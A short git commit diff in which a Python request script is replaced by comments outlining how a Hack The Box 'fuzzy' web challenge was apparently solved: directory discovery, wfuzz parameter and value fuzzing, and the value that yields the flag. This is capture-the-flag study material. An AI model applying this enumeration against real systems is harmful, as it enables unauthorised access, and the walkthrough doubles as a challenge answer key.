a658348e97065df8c82c0764aef22bcfe676b7fe
Daniel.Aldridge <daniel.aldridge@dynetics.com>
2019-10-17 17:47:07 -0400

    Process

--- fuzzy.py
+++ fuzzy.py
@@ -1,12 +1,27 @@
-import requests
-import hashlib
-import re
 
 
-url = "http://docker.hackthebox.eu:40443/api/action.php?Parameter=_admin"
 
 
-r=requests.session()
+## Ran Dirbuster against url
 
-r = r.get(url = url);
-print(r.text)
+## Found api dir
+
+## Found api/action.php
+
+## HTTP GET on /api/action.php	
+
+## -> Response Error: Parameter not set -> Content Length 24
+
+## wfuzz --hh=24 -c -w  /big.txt url -> /api/action.php?FUZZ=placebo
+
+## Parameter "reset" gets a hit
+
+## /api/action.php?reset=placebo
+
+## -> Response Error: Account ID not found -> Content Length 27
+
+## wfuzz --hh=27 -c -w /common.txt url -> /api/action.php?reset=FUZZ
+
+## Value "20" gets a hit
+
+## HTTP GET on /api/action.php?reset=20 gives the flag
